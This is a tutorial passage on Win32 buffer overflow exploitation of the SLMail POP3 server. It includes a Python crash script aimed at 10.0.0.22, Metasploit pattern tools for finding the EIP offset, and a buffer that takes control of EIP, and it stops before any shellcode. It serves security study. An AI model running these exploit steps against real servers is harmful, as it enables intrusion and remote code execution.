# Win32 Buffer Overflow Exploitation

### Replicating the Crash

  - Our first task in the exploitation process is to write a simple script that will replicate our observed crash, without having to run the fuzzer each time.

    ```python
    #!/usr/bin/python
    import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = 'A' * 2700
    try:
      print "\nSending evil buffer..."
      s.connect(('10.0.0.22',110))
      data = s.recv(1024)
      s.send('USER username' +'\r\n')
      data = s.recv(1024)
      s.send('PASS ' + buffer + '\r\n')
      print "\nDone!."
    except:
      print "Could not connect to POP3!"
    ```
### Controlling EIP

  - Getting control of the EIP register is a crucial step of exploit development.

  - For this reason, it is vital that we locate those
  4 A’s that overwrite our EIP register in the buffer.
  - There are two common ways to do this:

    #### Binary Tree Analysis

      - Instead of 2700 A’s, we send 1350 A'ʹs and 1350 B'ʹs.
      - If EIP is overwritten by B'ʹs, we know the four bytes reside in the second half of the buffer.
      - We then change the 1350 B'ʹs to 675 B'ʹs and 675 C'ʹs, and send the buffer again.
      - If EIP is overwritten by C'ʹs, we know that the four bytes reside in the 2000–2700 byte range.
      - We continue splitting the specific buffer until we reach the exact four bytes that overwrite EIP.
      - Mathematically, this should happen in seven iterations.

    #### Sending a Unique String

      - The faster method of identifying these four bytes is to send a unique string of 2700 bytes, identify the 4 bytes that overwrite EIP, and then locate those four bytes in our unique buffer.
      - __pattern_create.rb__ is a Ruby tool for creating and locating such buffers, and can be found as part of the Metasploit Framework exploit development scripts.

        ```shell
        > locate pattern_create
        > /usr/share/metasploit-framework/tools/patte_create.rb 2700
        ```
      - We can now use the companion to pattern_create, pattern_offset.rb, to discover the offset of these specific 4 bytes in our unique byte string.
      ![EIP Overwritten by the Unique Pattern](/images/34.png)

        ```shell
        # whe got 39694438 after Plugging the previous unique buffer instead of our 2700 A’s into our Python exploit produces an EIP overwrite with offset 39694438
        > /usr/share/metasploit-framework/tools/pattern_offset.rb 39694438
        # running resutl :[*] Exact match at offset 2606
        ```
        - The pattern_offset.rb script reports these 4 bytes being located at offset 2606 of the 2700 bytes.
        - Let’s translate this to a new modified buffer string, and see if we can control the EIP register. We modify our exploit to contain the following buffer string

          ```python
          buffer = "A" * 2606 + "B" * 4 + "C" * 90
          ```

          ![EIP is Controlled](/images/35.png)

        - Sending this new buffer to the SLMail POP3 server produces the following crash in our debugger. Once again, take note of the ESP and EIP registers.
        - This time, the ESP has a different value than our first crash. The EIP register is cleanly overwritten by B’s (\x42), signifying that our calculations were correct, and we can now control the execution flow of the SLMail application.

      - Where, exactly, do we redirect the execution flow, now that we control the EIP register?
      - Part of our buffer can contain the code (or shellcode) we would like to have executed by the SLMail application, such as a reverse shell.

### Locating Space for Your Shellcode

  - The Metasploit Framework can automatically generate shellcode payloads.
  - A standard reverse shell payload requires about 350-400 bytes of space.
  - Looking back at the last crash, we can see that the ESP register points directly to the beginning of our buffer of C’s.

  ![ESP is Pointing to the Buffer of C'ʹs](/images/36.png)
